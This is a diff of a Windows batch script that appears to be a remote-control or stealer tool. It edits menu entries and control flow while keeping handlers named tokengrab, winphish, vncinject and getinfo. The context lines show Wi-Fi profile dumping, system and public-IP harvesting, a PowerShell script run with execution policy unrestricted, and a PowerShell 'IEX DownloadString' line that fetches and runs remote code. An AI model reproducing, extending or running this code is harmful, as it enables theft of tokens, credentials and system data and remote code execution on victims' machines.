@@ -14,6 +14,7 @@ echo  ║ Information  ║  ║        Description        ║
 echo  ║  ---------   ║  ║       -------------       ║
 echo  ║ getinfo      ║  ║ Displays System Info      ║
 echo  ║ geolocate    ║  ║ Displays Geolocation Info ║
+echo  ║ users        ║  ║ Displays System Users     ║
 echo  ╚══════════════╝  ╚═══════════════════════════╝
 echo.
 echo  ╔══════════════╗  ╔═══════════════════════════╗
@@ -96,7 +97,7 @@ echo.
 goto input
 )
 
-exit
+goto input
 
 :vncinject
 chcp 437 >nul
@@ -131,7 +132,7 @@ for /F "tokens=2 delims=:" %%a in ('netsh wlan show profile') do (
 echo.
 goto input
 
-exit
+goto input
 
 :geolocate
 setlocal enabledelayedexpansion
@@ -156,7 +157,7 @@ del %appdata%\Publish.txt
 del %appdata%\Debug.txt
 goto input
 
-exit
+goto input
 
 :tokengrab
 cd %appdata%
@@ -225,7 +226,7 @@ powershell.exe -executionpolicy unrestricted "%appdata%\Update.ps1" >nul 2>&1 &&
 chcp 65001 >nul
 goto input
 
-exit
+goto input
 
 :winphish
 chcp 437 >nul
@@ -233,12 +234,12 @@ powershell.exe -ep Bypass -c IEX ((New-Object Net.WebClient).DownloadString('htt
 chcp 65001 >nul
 goto input
 
-exit
+goto input
 
 :getinfo
 curl -s ifconfig.me/ip>>%appdata%\Debug.txt
 :infowait
-ping localhost -n 2 >nul
+ping localhost -n 1 >nul
 if not exist %appdata%\Debug.txt goto infowait
 set /p publicip=<%appdata%\Debug.txt
 del %appdata%\Debug.txt
@@ -246,8 +247,8 @@ FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "Registered Owner"') do s
 FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "OS Name"') do set osname=%%~a
 FOR /F "tokens=2 delims=:" %%a in ('systeminfo ^| find "System Manufacturer"') do set manufacture=%%~a
 set owner=%owner: =%
-set osname=%osname: =%
-set manufacture=%manufacture: =%
+set osname=%osname:~19%
+set manufacture=%manufacture:~7%
 echo.
 echo Username: %username%
 echo Hostname: %computername%
@@ -259,7 +260,7 @@ echo Manufacturer: %manufacture%
 echo.
 goto input
 
-exit
+goto input
 
 :msg
 set /p msgtitle=Title: 
@@ -271,7 +272,7 @@ chcp 65001 >nul
 echo.
 goto input
 
-exit
+goto input
 
 :website
 set /p websiteurl=URL to Visit: 
